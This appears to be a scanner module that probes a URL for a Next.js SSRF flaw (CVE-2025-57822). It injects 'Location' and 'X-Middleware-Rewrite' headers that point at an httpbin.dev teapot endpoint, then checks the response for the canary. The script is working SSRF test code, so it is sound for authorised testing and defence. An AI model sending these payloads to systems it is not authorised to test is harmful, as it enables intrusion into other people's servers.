#!/usr/bin/env python3

"""
CVE-2025-57822

https://x.com/intigriti/status/1977662600977465794
"""


from utils.style import Colors, Identify
from utils.utils import (
    configure_logger,
    requests,
    sys,
)

logger = configure_logger(__name__)

def nextjs_ssrf(url: str) -> None:
    s = requests.Session()
    s.headers.update(
                {
                    "User-agent": "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; LCJB; rv:11.0) like Gecko",
                    "Location": "https://httpbin.dev/status/418"
                }
            )
    headers_payload = [
        {"Location": "https://httpbin.dev/status/418"},
        {"X-Middleware-Rewrite": "https://httpbin.dev/status/418"},
        {
            "Location": "https://httpbin.dev/status/418",
            "X-Middleware-Rewrite": "https://httpbin.dev/status/418"
        }
    ]
    for hp in headers_payload:
        try:
            req_ssrf = s.get(url, headers=hp, verify=False, timeout=10, allow_redirects=False)
            if "teapot" in req_ssrf.text:
                print(f"{Identify.confirmed} | SSRF | {url} | Header: 'Location: https://httpbin.dev/status/418'")
        except requests.Timeout:
            #print(f"request timeout {url} {p}")
            pass
        except KeyboardInterrupt:
            print("Exiting")
            sys.exit()
        except requests.exceptions.InvalidHeader:
            pass
        except Exception as e:
            #traceback.print_exc()
            #print(f"Error : {e}")
            pass